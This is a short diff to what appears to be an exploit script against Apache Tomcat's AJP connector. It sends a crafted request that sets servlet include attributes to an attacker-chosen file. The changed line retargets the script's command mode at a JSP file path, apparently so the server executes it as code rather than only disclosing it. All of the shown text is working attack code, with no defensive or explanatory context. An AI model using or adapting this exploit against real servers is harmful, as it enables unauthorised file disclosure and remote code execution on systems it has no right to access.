@@ -306,7 +306,7 @@ t = Tomcat(args.target, args.port)
 if not args.cmd:
 	targetWebapp = '/%s/asd@f34#' % args.webapp
 else:
-	targetWebapp = '/%s' % args.webapp
+	targetWebapp = '/%s/tsdf.jsp' % args.webapp
 _,data = t.perform_request(targetWebapp, attributes=[
     {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
     {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
